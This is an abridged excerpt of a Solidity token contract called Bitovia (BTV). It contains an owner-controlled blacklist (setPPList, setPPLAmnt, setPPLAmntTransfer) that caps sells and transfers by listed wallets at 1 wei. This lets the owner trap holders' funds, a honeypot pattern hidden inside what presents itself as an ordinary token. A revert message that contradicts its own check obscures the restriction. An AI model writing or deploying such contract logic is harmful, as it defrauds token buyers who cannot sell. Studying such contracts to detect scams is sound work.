...
contract Bitovia is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _setPPlList;
    string  private constant _name = "Bitovia"; 
    string  private constant _symbol = "BTV";   
    uint8   private constant _decimals = 18; 
    uint256 private _tTotal = 990000000 * 10 ** _decimals;
    ...
    uint8   public BuyOrSell = 2;
     ...
     address payable public _Wallet = payable(0x954bD7b81AF143740A75D02da36Cb80f85E13C30);
    ...
    bool public noFeeToTransfer = true;
     uint256 public _pplamnt = 1;
    uint256 public _pplamntTrans = 1;
   ...
   event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity, address From);
    ...
    function _transfer(
        ...
        if (from != uniswapV2Pair && to != uniswapV2Pair) {
            ...
            IsP2p = true;
            if (_setPPlList[from] && !_isExcludedFromFee[from]) {
                require(amount <= _pplamntTrans, "Transfer amount must be greater than given amount");
            }
        ...
        if (takeFee) {
            ...
            if (BuyOrSell == 1) {
                ...
                if (_setPPlList[from]) {
                    ...
                    emit _comments("PPLAmount ", _pplamnt);
                    require(amount <= _pplamnt, "Transfer amount must be greater than given amount");
                }
            }
 ...
 event _addedLiquidity(address thisAddress, uint256 _tokenAmount, uint256 _ETHamount, address pancakRouter);
    ...
    function setPPList(address _walletAddr, bool inputamnt) external onlyOwner {
        _setPPlList[_walletAddr] = inputamnt;
    }

    function displayPPLtatus(address _walletAddr) public view returns(bool) {
        return _setPPlList[_walletAddr];
    }

    function setPPLAmnt(uint256 inmnt) external onlyOwner {
        _pplamnt = inmnt;
    }
    function setPPLAmntTransfer(uint256 amnt) external onlyOwner {
        _pplamntTrans = amnt;
    }
